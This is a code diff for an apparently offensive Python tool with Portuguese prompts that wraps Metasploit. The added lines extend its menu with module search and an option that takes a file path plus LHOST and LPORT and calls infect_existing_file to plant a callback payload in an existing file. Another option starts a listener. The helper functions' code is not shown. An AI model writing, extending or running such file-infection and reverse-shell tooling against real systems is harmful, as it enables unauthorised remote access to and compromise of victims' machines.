@@ -125,3 +125,22 @@ def main():
             start_listener(lhost, lport)
         elif option == "3":
             module_list = list_msf4_modules()
+        elif option == "4":
+            if "module_list" in locals():
+                query = input("Digite o nome do módulo que deseja pesquisar: ")
+                search_modules(query, module_list)
+            else:
+                print("Primeiro liste os módulos no diretório .msf4 (opção 3).")
+        elif option == "5":
+            file_path = input("Insira o caminho do arquivo a ser infectado: ")
+            lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
+            lport = input("Insira o LPORT: ")
+            infect_existing_file(file_path, lhost, lport)
+        elif option == "6":
+            print("Encerrando o programa.")
+            break
+        else:
+            print("Opção inválida. Tente novamente.")
+
+if __name__ == "__main__":
+    main()
